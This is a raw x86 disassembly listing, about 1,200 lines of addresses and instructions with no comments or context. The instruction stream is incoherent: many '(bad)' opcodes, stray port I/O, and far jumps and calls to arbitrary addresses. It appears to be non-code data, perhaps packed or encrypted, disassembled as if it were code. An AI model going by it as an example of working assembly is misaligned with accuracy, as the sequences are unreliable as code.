  427a9c:	jo     0x427a6e
  427a9e:	and    ah,BYTE PTR [esi]
  427aa0:	jno    0x427b0a
  427aa2:	push   edx
  427aa3:	add    DWORD PTR [esi],0xffffffcd
  427aa6:	and    BYTE PTR [ebx],bh
  427aa8:	pusha  
  427aa9:	dec    ebx
  427aaa:	and    ah,BYTE PTR [ebx+0x52224e6f]
  427ab0:	mov    al,0xb0
  427ab2:	popa   
  427ab3:	dec    eax
  427ab4:	xchg   ebp,eax
  427ab5:	mov    eax,ds:0xa473015c
  427aba:	les    eax,FWORD PTR [eax+0x10]
  427abd:	mov    eax,0xdb5a9414
  427ac2:	gs in  al,0x26
  427ac5:	imul   esi,ecx,0xc2a8b3f
  427acb:	dec    edi
  427acc:	jp     0x427afc
  427ace:	pusha  
  427acf:	fimul  WORD PTR [eax+edi*4]
  427ad2:	sub    ebx,DWORD PTR ds:0xfc36225
  427ad8:	sub    al,0x8b
  427ada:	rcl    BYTE PTR [edx+0x27],1
  427add:	and    al,0x2
  427adf:	ss sub al,0x41
  427ae2:	adc    esp,edx
  427ae4:	sbb    al,0x5
  427ae6:	xchg   ecx,eax
  427ae7:	and    edx,DWORD PTR [edx]
  427ae9:	gs push esp
  427aeb:	jne    0x427af2
  427aed:	add    al,dh
  427aef:	mov    esi,0x4c8b4242
  427af4:	pop    ecx
  427af5:	mov    ebp,0x1aa68602
  427afa:	xor    dh,BYTE PTR [edi-0x22]
  427afd:	test   BYTE PTR [eax],al
  427aff:	push   0x352e32f7
  427b04:	cmp    edi,eax
  427b06:	shl    ebx,cl
  427b08:	mov    bh,0x83
  427b0a:	jge    0x427ad2
  427b0c:	js     0x427ac2
  427b0e:	cmp    bl,0xce
  427b11:	fisttp QWORD PTR [ebp+0x7087dcdc]
  427b17:	and    esp,ebx
  427b19:	imul   eax,DWORD PTR [edi+0x4e],0xac3b5c60
  427b20:	xchg   DWORD PTR ds:0xf38d6a64,esi
  427b26:	and    BYTE PTR [ecx],ah
  427b28:	out    dx,eax
  427b29:	data16 lods al,BYTE PTR ds:[esi]
  427b2b:	ror    BYTE PTR [eax],1
  427b2d:	mov    bl,0xd3
  427b2f:	push   edi
  427b30:	popa   
  427b31:	out    dx,al
  427b32:	and    ebp,DWORD PTR [esi]
  427b34:	jl     0x427b26
  427b36:	jmp    0x7a1a9a3
  427b3b:	les    eax,FWORD PTR [esi]
  427b3d:	xchg   ebx,eax
  427b3e:	aad    0x89
  427b40:	loop   0x427b63
  427b42:	test   eax,0x6221d46f
  427b47:	clc    
  427b48:	push   0xffffff84
  427b4a:	fucomp st(5)
  427b4c:	cmp    edx,edi
  427b4e:	cmp    BYTE PTR [edi],bl
  427b50:	and    eax,0x893caacb
  427b55:	pop    ebp
  427b56:	or     al,0xbe
  427b58:	loopne 0x427b44
  427b5a:	out    dx,eax
  427b5b:	or     ecx,DWORD PTR [ecx]
  427b5d:	dec    edx
  427b5e:	push   esi
  427b5f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427b60:	or     BYTE PTR [ebp+eax*1+0x67ddc50d],ch
  427b67:	add    BYTE PTR [esi],al
  427b69:	xchg   esi,eax
  427b6a:	jb     0x427bc3
  427b6c:	adc    eax,0x9d8603d4
  427b71:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427b72:	xchg   edi,eax
  427b73:	(bad)  
  427b74:	js     0x427b42
  427b76:	mov    edx,0xa23c3b1e
  427b7b:	loopne 0x427bcb
  427b7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427b7e:	mov    ebp,0x8f0552d
  427b83:	and    eax,DWORD PTR ds:0x60b4cafd
  427b89:	sub    ah,BYTE PTR [ecx]
  427b8b:	bound  edx,QWORD PTR [esi]
  427b8d:	(bad)  
  427b8e:	aam    0x97
  427b90:	xor    ch,BYTE PTR [edi+0x3d]
  427b93:	je     0x427b8e
  427b95:	int3   
  427b96:	mov    cl,0x9b
  427b98:	outs   dx,DWORD PTR ds:[esi]
  427b99:	clc    
  427b9a:	dec    edi
  427b9b:	js     0x427b9f
  427b9d:	lods   eax,DWORD PTR ds:[esi]
  427b9e:	aas    
  427b9f:	lock add al,0x78
  427ba2:	add    BYTE PTR [eax-0x19],al
  427ba5:	add    eax,0xef7d5784
  427baa:	imul   edi,edi,0xffffffde
  427bad:	test   eax,0x716f17d3
  427bb2:	and    DWORD PTR [eax+0x557c9e0b],esi
  427bb8:	ror    DWORD PTR [ebp-0x457b3eb6],0xa8
  427bbf:	xchg   edx,eax
  427bc0:	xor    ah,BYTE PTR [ebp+ecx*8+0x4d944cda]
  427bc7:	ret    
  427bc8:	jmp    0x427c21
  427bca:	inc    edi
  427bcb:	inc    edi
  427bcc:	sub    DWORD PTR [esi+0x6a],esp
  427bcf:	cwde   
  427bd0:	pop    es
  427bd1:	cmp    BYTE PTR [ecx+0x7],al
  427bd4:	sbb    dl,BYTE PTR [esi+0x6bb2f5ff]
  427bda:	data16 shr BYTE PTR [ecx+0x84f569b],0xb3
  427be2:	mov    esp,0xc59f2987
  427be7:	hlt    
  427be8:	call   0xdabc53f0
  427bed:	pop    ebp
  427bee:	mov    BYTE PTR [ebx+0x3ad3886d],dl
  427bf4:	(bad)  
  427bf5:	jl     0x427b88
  427bf7:	xchg   ecx,eax
  427bf8:	mov    bh,0xa3
  427bfa:	shl    DWORD PTR [eax+0x1b],1
  427bfd:	adc    ebx,DWORD PTR gs:[ecx+0x2c4a4a22]
  427c04:	cdq    
  427c05:	bound  eax,QWORD PTR [edx-0x34]
  427c08:	adc    DWORD PTR [ebp-0x25],ebp
  427c0b:	mov    al,ds:0x24922d89
  427c10:	fs into 
  427c12:	sbb    eax,0x749ba166
  427c17:	fcom   DWORD PTR [ebp-0x39adec82]
  427c1d:	and    BYTE PTR [edi],cl
  427c1f:	adc    BYTE PTR [edx],al
  427c21:	pushf  
  427c22:	scas   eax,DWORD PTR es:[edi]
  427c23:	push   ecx
  427c24:	lds    ebx,FWORD PTR [edx]
  427c26:	xor    DWORD PTR [esi+0x24422e88],esi
  427c2c:	inc    ecx
  427c2d:	mov    ds:0x5382b9a5,al
  427c32:	retf   
  427c33:	out    dx,al
  427c34:	mov    eax,ds:0xd1568a15
  427c39:	dec    eax
  427c3a:	lods   al,BYTE PTR ds:[esi]
  427c3b:	rcl    DWORD PTR [esi-0x62658af6],cl
  427c41:	adc    ebx,eax
  427c43:	add    cl,ah
  427c45:	add    BYTE PTR [ecx],0xaa
  427c48:	cmp    al,0xa0
  427c4a:	sti    
  427c4b:	ret    
  427c4c:	xchg   ebp,eax
  427c4d:	inc    ebp
  427c4e:	lods   eax,DWORD PTR ds:[esi]
  427c4f:	push   ax
  427c51:	nop
  427c52:	loope  0x427cb0
  427c54:	mov    al,0xfd
  427c56:	xor    eax,0xad92c990
  427c5b:	cwde   
  427c5c:	dec    ecx
  427c5d:	sub    eax,0x8dc00534
  427c62:	sbb    eax,0x6018f5c6
  427c67:	inc    edx
  427c68:	ror    esi,cl
  427c6a:	loope  0x427c08
  427c6c:	dec    esi
  427c6d:	fs (bad) 
  427c6f:	into   
  427c70:	int3   
  427c71:	fs push eax
  427c73:	mov    esp,DWORD PTR [eax]
  427c75:	test   BYTE PTR [edx],bl
  427c77:	inc    esp
  427c78:	sbb    DWORD PTR [ecx-0x1c],esp
  427c7b:	push   ecx
  427c7c:	push   ebp
  427c7d:	fisubr DWORD PTR [edx*4-0x50d64d5e]
  427c84:	push   esi
  427c85:	xor    eax,0xeb95fae
  427c8a:	sub    ecx,DWORD PTR [edi]
  427c8c:	fisttp WORD PTR [ebx+ecx*4-0x41b1f2c5]
  427c93:	out    dx,eax
  427c94:	es dec esp
  427c96:	es sub ebx,eax
  427c99:	imul   ecx,esi,0x2
  427c9c:	mov    ds:0xac1a8916,eax
  427ca1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427ca2:	sbb    eax,DWORD PTR [ecx-0x62]
  427ca5:	push   ecx
  427ca6:	xlat   BYTE PTR ds:[ebx]
  427ca7:	add    DWORD PTR [ebx],edi
  427ca9:	fwait
  427caa:	mov    bl,0x2e
  427cac:	rcl    DWORD PTR [eax+0x70],cl
  427caf:	xchg   esi,eax
  427cb0:	imul   eax,DWORD PTR cs:[eax-0x7d],0x1f
  427cb5:	sub    al,0xfd
  427cb7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427cb8:	out    dx,al
  427cb9:	lahf   
  427cba:	pop    ebx
  427cbb:	sub    al,0x15
  427cbd:	pop    es
  427cbe:	xchg   BYTE PTR [edi-0x17b6279d],dl
  427cc4:	js     0x427d16
  427cc6:	test   DWORD PTR [eax-0x703cc13f],ecx
  427ccc:	sbb    bl,BYTE PTR [esi]
  427cce:	ins    BYTE PTR es:[edi],dx
  427ccf:	adc    BYTE PTR [edx-0x6a],bh
  427cd2:	mov    ch,0xc5
  427cd4:	lods   al,BYTE PTR ds:[esi]
  427cd5:	in     al,dx
  427cd6:	retf   
  427cd7:	mov    esi,0x8055700a
  427cdc:	ja     0x427cd8
  427cde:	and    DWORD PTR [ecx],edi
  427ce0:	push   0xffffffd1
  427ce2:	push   ebp
  427ce3:	fild   DWORD PTR [esp+ecx*8-0x1a]
  427ce7:	sub    eax,0xe8a8b366
  427cec:	jg     0x427d04
  427cee:	dec    esp
  427cef:	ja     0x427ccc
  427cf1:	jg     0x427ce4
  427cf3:	lea    edi,[edi-0xa81b00a]
  427cf9:	daa    
  427cfa:	jo     0x427ce5
  427cfc:	or     DWORD PTR [ebp+0x0],edx
  427cff:	(bad)  
  427d00:	dec    ebx
  427d01:	sbb    eax,0xb3b6e2c0
  427d06:	mov    bl,0x83
  427d08:	aad    0xd5
  427d0a:	aad    0xfc
  427d0c:	xor    eax,0xff70df37
  427d11:	pop    ds
  427d12:	cld    
  427d13:	mov    bh,0x3b
  427d15:	pop    esi
  427d16:	nop
  427d17:	bound  edi,QWORD PTR [esi+0x16]
  427d1a:	mov    bl,0x56
  427d1c:	pop    ebp
  427d1d:	xor    ebx,DWORD PTR [ecx-0x67]
  427d20:	es ja  0x427cb1
  427d23:	cmp    al,0x4a
  427d25:	rol    DWORD PTR [esi-0x17],0x10
  427d29:	hlt    
  427d2a:	call   0x20:0xd98
  427d31:	dec    ecx
  427d32:	inc    esp
  427d33:	inc    ecx
  427d34:	push   esp
  427d35:	xor    BYTE PTR ds:0x72fb59dd,bl
  427d3b:	icebp  
  427d3c:	not    BYTE PTR [ebp-0x2d17fd6d]
  427d42:	imul   esi,esi,0x4
  427d45:	inc    ebx
  427d46:	pop    ss
  427d47:	jp     0x427cf8
  427d49:	xchg   ebp,eax
  427d4b:	loop   0x427da1
  427d4d:	jne    0x427d24
  427d4f:	mov    BYTE PTR [eax],cl
  427d51:	jno    0x427d0f
  427d53:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427d54:	adc    BYTE PTR [ebp+0x6],0xa8
  427d58:	test   DWORD PTR [ebp-0x5c8bdd10],ecx
  427d5e:	mov    ds:0xe4af4bac,al
  427d63:	mov    edx,0x81dc4eb4
  427d68:	dec    ecx
  427d69:	sub    eax,ecx
  427d6b:	in     al,dx
  427d6c:	mov    al,0x6a
  427d6e:	add    DWORD PTR [ecx+0x34],ecx
  427d71:	dec    ebx
  427d72:	push   eax
  427d73:	sbb    al,ah
  427d75:	in     eax,dx
  427d76:	xor    eax,0x76ce2dfd
  427d7b:	int3   
  427d7c:	inc    eax
  427d7d:	push   ax
  427d7f:	lock lock in al,0x81
  427d83:	xchg   esi,eax
  427d84:	nop
  427d85:	cmp    DWORD PTR [ebp-0xd],esi
  427d88:	adc    al,0xbb
  427d8a:	stos   BYTE PTR es:[edi],al
  427d8b:	mov    ecx,0xdc5fadc2
  427d90:	pop    esp
  427d91:	xchg   BYTE PTR [edx-0x7182fa67],bh
  427d97:	sar    dh,1
  427d99:	and    DWORD PTR [ecx+0x7a],0xffffffae
  427d9d:	sbb    BYTE PTR [ebp+0x46],0x46
  427da1:	loope  0x427d3f
  427da3:	jmp    0x427d73
  427da5:	inc    edi
  427da6:	cdq    
  427da7:	push   ss
  427da8:	xchg   esp,eax
  427da9:	push   ebx
  427daa:	jmp    0x18fd:0x3a7635f0
  427db1:	xlat   BYTE PTR ss:[ebx]
  427db3:	inc    eax
  427db4:	lahf   
  427db5:	add    ebx,DWORD PTR [ebp+edx*1+0x10]
  427db9:	jl     0x427e0b
  427dbb:	mov    es,WORD PTR [edx+0x1be0a926]
  427dc1:	aad    0x37
  427dc3:	inc    esp
  427dc4:	adc    eax,0xece93201
  427dc9:	pop    ds
  427dca:	adc    DWORD PTR [ebx+esi*8],esi
  427dcd:	test   BYTE PTR [ecx-0x66],ch
  427dd0:	mov    ds:0x6db47349,al
  427dd5:	inc    esp
  427dd6:	sub    ebp,DWORD PTR ds:0x99c1b166
  427ddc:	jmp    0xefec1a5a
  427de1:	shl    DWORD PTR [ebx+0x354359ae],0x62
  427de8:	dec    esp
  427de9:	push   edi
  427dea:	dec    edi
  427deb:	and    bl,BYTE PTR [edi]
  427ded:	mov    esi,0x1dd67a00
  427df2:	sbb    cl,bh
  427df4:	or     cl,BYTE PTR [ebp+0x38]
  427df7:	or     DWORD PTR [edi-0xa6cfd8d],edi
  427dfd:	adc    DWORD PTR [esi-0xf4c592d],esp
  427e03:	pop    ebp
  427e04:	dec    esi
  427e05:	mov    esi,0xf2ce8bac
  427e0a:	push   ss
  427e0b:	(bad)  
  427e0c:	mov    WORD PTR [edx],?
  427e0e:	push   gs
  427e10:	stos   DWORD PTR es:[edi],eax
  427e11:	add    DWORD PTR [eax],ebx
  427e13:	aam    0xc
  427e15:	adc    al,0x1c
  427e17:	xchg   DWORD PTR [eax],ecx
  427e19:	inc    esi
  427e1a:	loop   0x427e5d
  427e1c:	pop    ebp
  427e1d:	in     eax,dx
  427e1e:	or     DWORD PTR [edi+eax*8],ebp
  427e21:	iret   
  427e22:	sub    BYTE PTR [edi-0x46ab55f],bl
  427e28:	add    BYTE PTR [edx+0x55dca52e],0x1
  427e2f:	xchg   esi,eax
  427e30:	retf   0x2242
  427e33:	adc    BYTE PTR [ebx],bh
  427e35:	clc    
  427e36:	retf   0x8c21
  427e39:	sub    edx,DWORD PTR [ebp+edx*4-0x79]
  427e3d:	mov    bl,0x8c
  427e3f:	xchg   ecx,eax
  427e40:	pop    esi
  427e41:	pop    edx
  427e42:	xor    DWORD PTR [eax+0x51000e35],eax
  427e48:	ror    esi,0xd9
  427e4b:	fnsave [edi+0x7d]
  427e4e:	shr    ebx,cl
  427e50:	jg     0x427e3a
  427e52:	fistp  QWORD PTR [ecx+edx*2]
  427e55:	rcr    bh,0x70
  427e58:	jnp    0x427e36
  427e5a:	inc    ebx
  427e5b:	xor    BYTE PTR [edx-0x37939393],0x73
  427e62:	lahf   
  427e63:	jae    0x427ee1
  427e65:	div    BYTE PTR [edi+0x3f39f9be]
  427e6b:	test   BYTE PTR [edi-0x720a2149],0x29
  427e72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427e73:	xor    eax,0x8d14c4c9
  427e78:	and    eax,DWORD PTR [eax-0x1f4b13fc]
  427e7e:	adc    ebx,ecx
  427e80:	nop
  427e81:	pop    ecx
  427e82:	sbb    esi,DWORD PTR [edx]
  427e84:	rcr    DWORD PTR [ecx+0x6a544d2c],0x4b
  427e8b:	or     esi,0xbbc943d5
  427e91:	pop    ss
  427e92:	popa   
  427e93:	mov    cl,0x10
  427e95:	ror    DWORD PTR [eax+0x47],0x19
  427e99:	mov    al,BYTE PTR [esi-0x19]
  427e9c:	sub    al,0x48
  427e9e:	push   ecx
  427e9f:	push   ebx
  427ea0:	jnp    0x427e60
  427ea2:	stos   BYTE PTR es:[edi],al
  427ea3:	xor    BYTE PTR [edx-0x79],cl
  427ea6:	and    DWORD PTR [ebx],edi
  427ea8:	mov    ebx,0xc59d0f68
  427ead:	jl     0x427f21
  427eaf:	push   ds
  427eb0:	adc    al,0x3d
  427eb2:	xchg   edx,eax
  427eb3:	dec    ebx
  427eb4:	loopne 0x427e47
  427eb6:	xchg   DWORD PTR [eax+0x2],edx
  427eb9:	sbb    ah,BYTE PTR [ebp+0x4b661307]
  427ebf:	int    0x15
  427ec1:	cmove  eax,DWORD PTR [eax-0x54310fb4]
  427ec8:	adc    ah,BYTE PTR [eax+0x46]
  427ecb:	fwait
  427ecc:	pop    edx
  427ecd:	xor    al,0x68
  427ecf:	or     eax,0x31661817
  427ed4:	les    ebx,FWORD PTR [eax+edx*2+0x15]
  427ed8:	push   esp
  427ed9:	adc    al,BYTE PTR [esi]
  427edb:	pop    esp
  427edc:	and    BYTE PTR [eax+0x700eca45],0x1
  427ee3:	fidivr WORD PTR [ecx-0x5b]
  427ee6:	xchg   BYTE PTR [esi-0x4f],dh
  427ee9:	lock lahf 
  427eeb:	cwde   
  427eec:	cmp    ebp,DWORD PTR [edi-0x7e]
  427eef:	imul   ecx,DWORD PTR [edx],0xffffff8f
  427ef2:	or     ebp,edi
  427ef4:	popa   
  427ef5:	xchg   dl,ah
  427ef7:	and    eax,0x431a14c3
  427efc:	sub    eax,0xf14fb03e
  427f01:	in     al,0x98
  427f03:	int    0x72
  427f05:	pop    ss
  427f06:	popa   
  427f07:	rcl    DWORD PTR [eax+0x1514c329],1
  427f0d:	enter  0xe1aa,0x58
  427f11:	xor    esi,DWORD PTR [edx]
  427f13:	mov    ds:0x391c4f03,al
  427f18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427f19:	xchg   esp,eax
  427f1a:	nop
  427f1b:	data16 add ch,BYTE PTR [ecx]
  427f1e:	jge    0x427f32
  427f20:	push   cs
  427f21:	push   esi
  427f22:	fs and al,0x86
  427f25:	popf   
  427f26:	nop
  427f27:	jge    0x427f80
  427f29:	(bad)  
  427f2a:	sbb    DWORD PTR [edx+0x20],edi
  427f2d:	retf   
  427f2e:	push   0xffffff8b
  427f30:	push   edx
  427f31:	stos   BYTE PTR es:[edi],al
  427f32:	cmp    ebp,edi
  427f34:	int    0x7b
  427f36:	ins    DWORD PTR es:[edi],dx
  427f37:	mov    esi,edi
  427f39:	popf   
  427f3a:	std    
  427f3b:	adc    dh,dl
  427f3d:	scas   al,BYTE PTR es:[edi]
  427f3e:	inc    DWORD PTR [esi+eax*2]
  427f41:	jle    0x427f48
  427f43:	repz jns 0x427ec9
  427f46:	mov    dh,0x49
  427f48:	enter  0x69d5,0x3c
  427f4c:	ins    DWORD PTR es:[edi],dx
  427f4d:	sti    
  427f4e:	imul   esi,DWORD PTR [eax+0x6b0cd0f9],0xffffffb2
  427f55:	mov    ds:0xec667060,al
  427f5a:	add    eax,DWORD PTR [edx]
  427f5c:	pop    es
  427f5d:	(bad)  
  427f5e:	cdq    
  427f5f:	mov    edx,0xf2e8c98b
  427f64:	stc    
  427f65:	(bad)
  427f68:	push   eax
  427f69:	mov    eax,0x194dd373
  427f6e:	mov    dl,0x81
  427f70:	jge    0x427f5e
  427f72:	test   al,0xdb
  427f74:	(bad)  
  427f75:	lods   al,BYTE PTR ds:[esi]
  427f76:	clc    
  427f77:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427f78:	mov    esi,ecx
  427f7a:	sub    esi,0xcc787933
  427f80:	cs int 0x5c
  427f83:	dec    esp
  427f84:	nop
  427f85:	sub    cl,BYTE PTR [edi]
  427f87:	out    0x1c,eax
  427f89:	jmp    0xed9f:0xbe084791
  427f90:	pop    es
  427f91:	sbb    BYTE PTR [edi],dl
  427f93:	inc    ebx
  427f94:	inc    esi
  427f95:	mov    ah,0x61
  427f97:	lods   eax,DWORD PTR ds:[esi]
  427f98:	add    al,BYTE PTR [ecx]
  427f9a:	cmp    esp,eax
  427f9c:	repnz inc ebx
  427f9e:	fwait
  427f9f:	fwait
  427fa0:	xlat   BYTE PTR ds:[ebx]
  427fa1:	fdivr  QWORD PTR [ebx+eax*8-0x31]
  427fa5:	pop    ebp
  427fa6:	mov    ebp,0xe4c735b7
  427fab:	das    
  427fac:	and    eax,0xf6c98f32
  427fb1:	test   BYTE PTR [ecx],ch
  427fb3:	add    bl,bl
  427fb5:	repnz dec edi
  427fb7:	std    
  427fb8:	pop    edi
  427fb9:	(bad)  
  427fbb:	cdq    
  427fbc:	fucomi st,st(6)
  427fbe:	cmp    cl,bh
  427fc0:	and    esp,DWORD PTR [edi-0x31]
  427fc3:	pop    esp
  427fc4:	cli    
  427fc5:	das    
  427fc6:	or     al,0xa6
  427fc8:	mov    WORD PTR [esi+0x2bcd90b4],ss
  427fce:	dec    edi
  427fcf:	sahf   
  427fd0:	push   ebp
  427fd1:	aam    0x49
  427fd3:	dec    ebx
  427fd4:	adc    BYTE PTR [esi+0x20],dh
  427fd7:	sub    BYTE PTR [ebx-0x36],dh
  427fda:	dec    BYTE PTR [eax+0x5f]
  427fdd:	mov    edx,0xaf4380b
  427fe2:	cli    
  427fe3:	dec    ebx
  427fe4:	pop    edx
  427fe5:	test   BYTE PTR [eax-0x70],dl
  427fe8:	retf   
  427fe9:	xor    al,0xd8
  427feb:	dec    esp
  427fec:	dec    eax
  427fed:	adc    DWORD PTR [eax+0x3],eax
  427ff0:	push   esp
  427ff1:	into   
  427ff2:	ret    
  427ff3:	arpl   WORD PTR [edx-0x6cfb8450],ax
  427ff9:	repz aaa 
  427ffb:	and    DWORD PTR [esi-0x41],ebx
  427ffe:	sub    eax,0xffffffe6
  428001:	pusha  
  428002:	out    dx,eax
  428003:	aam    0x25
  428005:	es dec ebp
  428007:	ret    
  428008:	xor    DWORD PTR [edi+esi*1-0x16],ebx
  42800c:	mov    ebx,0x52d89603
  428011:	jno    0x427fd5
  428013:	popf   
  428014:	xchg   ebp,eax
  428015:	jo     0x427fe5
  428017:	xor    DWORD PTR [ebx-0x26aeb3bd],0x8126c880
  428021:	jbe    0x428091
  428023:	lods   al,BYTE PTR ds:[esi]
  428024:	fisttp QWORD PTR [ebx+0x222efca1]
  42802a:	shl    DWORD PTR [edx-0x46e7ff00],0x9
  428031:	imul   cx,WORD PTR [edx-0x698ba46c],0x8adc
  42803a:	cdq    
  42803b:	retf   0x924f
  42803e:	and    al,0xc0
  428040:	sub    al,0x76
  428042:	sbb    eax,0xf1580cf
  428047:	jns    0x42806e
  428049:	pop    es
  42804a:	test   DWORD PTR [ebx],esp
  42804c:	adc    al,0x16
  42804e:	pop    ebx
  42804f:	dec    ecx
  428050:	add    cl,dl
  428052:	fucompp 
  428054:	push   edi
  428055:	jmp    0x670:0xdff6b417
  42805c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42805d:	pop    ecx
  42805e:	adc    esp,DWORD PTR [edx]
  428060:	addr16 cdq 
  428062:	mov    BYTE PTR [ebp+eiz*1-0x4d],ch
  428066:	lods   al,BYTE PTR ds:[esi]
  428067:	lea    ebx,[edx-0x72]
  42806a:	mov    ch,0x65
  42806c:	call   0x38cd:0x91408692
  428073:	jo     0xb98a83b1
  428079:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42807a:	repnz pusha 
  42807c:	mov    eax,0x5154ac22
  428081:	inc    esp
  428082:	test   eax,0x112023d4
  428087:	fcomp  st(2)
  428089:	ffree  st(1)
  42808b:	fiadd  DWORD PTR gs:[ecx]
  42808e:	test   cl,al
  428090:	add    BYTE PTR [ebp+eax*2-0x10],bl
  428094:	xlat   BYTE PTR ds:[ebx]
  428095:	ds or  al,0x76
  428098:	pop    edi
  428099:	(bad)  [edi]
  42809b:	stc    
  42809c:	or     al,0xaf
  42809e:	stos   DWORD PTR es:[edi],eax
  42809f:	pop    ebp
  4280a0:	bound  ecx,QWORD PTR [di-0xa19]
  4280a5:	jle    0x4280c7
  4280a7:	rol    BYTE PTR [ebx-0x1c],0xbe
  4280ab:	call   0xd57583bd
  4280b0:	cmp    ebx,ebx
  4280b2:	pmuludq mm6,mm5
  4280b5:	or     BYTE PTR [edi-0x409c3cae],0xa4
  4280bc:	(bad)
  4280c0:	pop    ss
  4280c1:	sar    BYTE PTR [ecx-0x6c],1
  4280c4:	neg    BYTE PTR [ecx]
  4280c6:	inc    esp
  4280c7:	pop    edx
  4280c8:	cwde   
  4280c9:	(bad)  
  4280ca:	fisub  WORD PTR [ecx-0x8b14356]
  4280d0:	mov    cl,0xfa
  4280d2:	call   edx
  4280d4:	xchg   ebp,eax
  4280d5:	sub    DWORD PTR [ecx],ebp
  4280d7:	and    DWORD PTR [esi],esi
  4280d9:	sbb    BYTE PTR [eax-0x7bd390ae],0xb0
  4280e0:	jle    0x4280df
  4280e2:	rcr    DWORD PTR [edi-0x1b816002],1
  4280e8:	adc    eax,0xf1c1fe1f
  4280ed:	ins    BYTE PTR es:[edi],dx
  4280ee:	shr    BYTE PTR [ecx],0xfe
  4280f1:	les    ebp,FWORD PTR [ebp-0x4]
  4280f4:	call   0xdbb8bdb4
  4280f9:	mov    dh,0x86
  4280fc:	add    BYTE PTR [eax+0x5f],ch
  4280ff:	repz out dx,eax
  428101:	mov    esi,0x554377e7
  428106:	mov    ebp,0x2594c52d
  42810b:	sub    ch,BYTE PTR [edx-0x66]
  42810e:	(bad)  [ebp+ebx*2+0x78]
  428112:	pop    edx
  428113:	push   ebp
  428114:	test   DWORD PTR [eax+0x6e],esp
  428117:	mov    ah,0x15
  428119:	jge    0x4280f6
  42811b:	mov    al,0xd9
  42811d:	or     ebx,0x13c5e80b
  428123:	xchg   esp,eax
  428124:	cli    
  428125:	cmc    
  428126:	and    bl,BYTE PTR ds:0x6d05ba52
  42812c:	popf   
  42812d:	adc    al,0xde
  42812f:	adc    dl,0xa2
  428132:	sbb    al,0x5b
  428134:	inc    edx
  428135:	ror    BYTE PTR [eax],0xa3
  428138:	jl     0x428146
  42813a:	loope  0x42812e
  42813c:	xor    eax,0xa67b9d18
  428141:	jbe    0x4281b5
  428143:	add    eax,0xaa042780
  428148:	ins    DWORD PTR es:[edi],dx
  428149:	add    BYTE PTR [ebx+0x6efb97b9],0x52
  428150:	pop    esp
  428151:	inc    ecx
  428152:	cwde   
  428153:	jmp    0x42811d
  428155:	lock sbb al,0x30
  428158:	or     dh,BYTE PTR ds:0x7508d546
  42815e:	adc    eax,0x92682154
  428163:	pop    ecx
  428164:	jg     0x4281a9
  428166:	lahf   
  428167:	inc    edx
  428168:	pop    es
  428169:	mov    dl,0x7
  42816b:	mov    DWORD PTR [edi],eax
  42816d:	sub    BYTE PTR [edx],ah
  42816f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  428170:	sbb    DWORD PTR [edx-0x72],esp
  428173:	mov    BYTE PTR [esi-0x7295eabf],bh
  428179:	iret   
  42817a:	leave  
  42817b:	jle    0x428194
  42817d:	inc    esp
  42817e:	test   edx,edx
  428180:	fincstp 
  428182:	dec    edi
  428183:	retf   0x9051
  428186:	arpl   si,bp
  428188:	push   es
  428189:	jne    0x4281b3
  42818b:	jo     0x4281f4
  42818d:	loopne 0x428126
  42818f:	mov    bl,0xcf
  428191:	xor    DWORD PTR [ecx-0x34],esp
  428194:	push   ss
  428195:	(bad)  
  428196:	hlt    
  428197:	loopne 0x4281c2
  428199:	add    esp,eax
  42819b:	adc    BYTE PTR [edi],al
  42819d:	jo     0x42820f
  42819f:	or     BYTE PTR [ebx],ah
  4281a1:	movntq QWORD PTR [ebp+0x21],mm1
  4281a5:	jne    0x428134
  4281a7:	sub    cl,BYTE PTR [esp+ecx*2-0xabac97e]
  4281ae:	mov    eax,0x2bd9831c
  4281b3:	lock push 0xca730673
  4281b9:	ss pop eax
  4281bb:	xchg   esp,eax
  4281bc:	ins    BYTE PTR es:[edi],dx
  4281bd:	adc    dl,BYTE PTR [esp+esi*2+0x386cadad]
  4281c4:	add    eax,0x7039ee80
  4281c9:	cdq    
  4281ca:	test   bl,cl
  4281cc:	lock ins BYTE PTR es:[edi],dx
  4281ce:	pop    ebp
  4281cf:	je     0x4281f4
  4281d1:	push   es
  4281d2:	dec    edi
  4281d3:	sbb    BYTE PTR [edx-0x1a],dh
  4281d6:	(bad)  
  4281d7:	ds xchg ebx,eax
  4281d9:	popa   
  4281da:	aad    0x74
  4281dc:	vcomisd xmm6,QWORD PTR ds:0xd392c5f9
  4281e4:	loopne 0x428184
  4281e6:	cwde   
  4281e7:	mov    ah,0x58
  4281e9:	stos   DWORD PTR es:[edi],eax
  4281ea:	push   eax
  4281eb:	outs   dx,DWORD PTR ds:[esi]
  4281ec:	xor    ebx,ebp
  4281ee:	or     al,0x46
  4281f0:	scas   eax,DWORD PTR es:[edi]
  4281f1:	mov    bl,0x10
  4281f3:	mov    esp,0xc764e10d
  4281f8:	ss popf 
  4281fa:	mov    bh,BYTE PTR [ebx+0x3622126]
  428200:	add    cl,BYTE PTR [ebx-0x37]
  428203:	das    
  428204:	repz loopne 0x4281ff
  428207:	fadd   QWORD PTR [ebp-0x2be725e4]
  42820d:	add    DWORD PTR [ebp-0x501ead52],0x46
  428214:	inc    ecx
  428215:	xchg   ebp,ebx
  428217:	pop    eax
  428218:	mov    eax,0x94df3056
  42821d:	add    al,0xd1
  42821f:	out    0x23,al
  428221:	or     ax,WORD PTR [ebp-0x9]
  428225:	cs dec esp
  428227:	fcomip st,st(1)
  428229:	int    0xff
  42822b:	(bad)  
  42822c:	jnp    0x4282ad
  42822e:	jge    0x4282a3
  428230:	cmp    al,0x7e
  428232:	ret    0xff5d
  428235:	mov    dl,0x3d
  428237:	mov    eax,ds:0x69b0000a
  42823c:	inc    edx
  42823d:	iret   
  42823e:	mov    ebx,0xbff7fe6e
  428243:	repz inc ebp
  428245:	call   FWORD PTR [edx]
  428247:	cmp    DWORD PTR [edi+0x5565394f],ebx
  42824d:	add    BYTE PTR [edx-0x5d],bh
